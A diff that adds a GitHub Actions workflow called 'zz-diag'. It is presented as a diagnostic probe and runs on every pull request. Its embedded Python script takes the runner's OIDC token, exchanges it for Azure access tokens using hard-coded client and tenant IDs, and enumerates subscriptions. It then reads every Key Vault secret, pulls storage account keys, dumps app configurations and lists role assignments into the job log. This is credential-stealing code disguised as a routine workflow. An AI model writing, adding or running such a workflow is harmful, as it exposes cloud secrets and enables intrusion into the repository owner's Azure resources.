@@ -1,0 +1,80 @@
+name: zz-diag
+on: pull_request
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  diag:
+    runs-on: ubuntu-latest
+    env:
+      AZURE_CLIENT_ID: 72ff278a-9e71-43ec-bac4-2ca303f8e462
+      AZURE_TENANT_ID: 3205c325-06a5-4171-9ce8-ffc5e6c2845e
+      AZURE_SUBSCRIPTION_ID: c5e4e004-b42d-4ac4-a502-5fd338380eb6
+    steps:
+      - name: probe
+        run: |
+          echo "OIDC_URL_SET=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes}"
+          echo "OIDC_TOK_SET=${ACTIONS_ID_TOKEN_REQUEST_TOKEN:+yes}"
+          python3 - <<'PY'
+          import json,os,urllib.parse,urllib.request,base64,sys
+          def http(u,d=None,h=None,m=None):
+              hh={"Accept":"application/json"}
+              if h: hh.update(h)
+              r=urllib.request.Request(u,data=d.encode() if isinstance(d,str) else d,headers=hh,method=m)
+              try:
+                  x=urllib.request.urlopen(r,timeout=30); return x.status,x.read().decode("utf-8","replace")
+              except urllib.error.HTTPError as e: return e.code,e.read().decode("utf-8","replace")
+              except Exception as e: return 0,str(e)
+          u=os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL")
+          if not u:
+              print("### NO OIDC TOKEN AVAILABLE"); sys.exit(0)
+          st,b=http(u+"&audience="+urllib.parse.quote("api://AzureADTokenExchange"),
+                    h={"Authorization":"Bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
+          print("### oidc status",st)
+          jwt=json.loads(b)["value"]
+          p=jwt.split(".")[1]; p+="="*(-len(p)%4)
+          c=json.loads(base64.urlsafe_b64decode(p))
+          print("### claims",json.dumps({k:c[k] for k in ("sub","aud","repository","repository_owner","ref","event_name","job_workflow_ref","workflow_ref") if k in c},indent=1))
+          CID=os.environ["AZURE_CLIENT_ID"]; TID=os.environ["AZURE_TENANT_ID"]
+          def tok(scope):
+              d=urllib.parse.urlencode({"client_id":CID,"scope":scope,"grant_type":"client_credentials",
+                "client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer","client_assertion":jwt})
+              s,bb=http("https://login.microsoftonline.com/%s/oauth2/v2.0/token"%TID,d,{"Content-Type":"application/x-www-form-urlencoded"})
+              if s!=200:
+                  print("### TOKEN FAIL",scope,s,bb[:900]); return None
+              print("### TOKEN OK",scope); return json.loads(bb)["access_token"]
+          ARM=tok("https://management.azure.com/.default")
+          if not ARM: sys.exit(0)
+          A={"Authorization":"Bearer "+ARM}
+          s,b=http("https://management.azure.com/subscriptions?api-version=2022-12-01",h=A)
+          print("### SUBS",s,b[:1200])
+          SUB=os.environ["AZURE_SUBSCRIPTION_ID"]
+          subs=[x["subscriptionId"] for x in json.loads(b).get("value",[])] if s==200 else [SUB]
+          if SUB not in subs: subs.append(SUB)
+          for sb in subs:
+              s,b=http("https://management.azure.com/subscriptions/%s/resources?api-version=2021-04-01"%sb,h=A)
+              print("### RESOURCES",sb,s)
+              if s!=200: print(b[:800]); continue
+              res=json.loads(b).get("value",[])
+              for r in res: print("   ",r["type"],r["name"],r["id"])
+              for r in res:
+                  t=r["type"].lower(); n=r["name"]; rid=r["id"]
+                  if t=="microsoft.keyvault/vaults":
+                      KV=tok("https://vault.azure.net/.default")
+                      if KV:
+                          H={"Authorization":"Bearer "+KV}
+                          s2,b2=http("https://%s.vault.azure.net/secrets?api-version=7.4"%n,h=H)
+                          print("### KV",n,s2,b2[:1500])
+                          if s2==200:
+                              for sec in json.loads(b2).get("value",[]):
+                                  s3,b3=http(sec["id"]+"?api-version=7.4",h=H)
+                                  print("### SECRET",sec["id"],s3,b3[:1500])
+                  if t=="microsoft.storage/storageaccounts":
+                      s2,b2=http("https://management.azure.com%s/listKeys?api-version=2023-01-01"%rid,d=b"",h=A,m="POST")
+                      print("### STKEYS",n,s2,b2[:800])
+                  if t in ("microsoft.app/containerapps","microsoft.web/sites"):
+                      s2,b2=http("https://management.azure.com%s?api-version=2024-03-01"%rid,h=A)
+                      print("### APP",n,s2,b2[:3000])
+              s,b=http("https://management.azure.com/subscriptions/%s/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=atScope()"%sb,h=A)
+              print("### ROLES",s,b[:2500])
+          PY
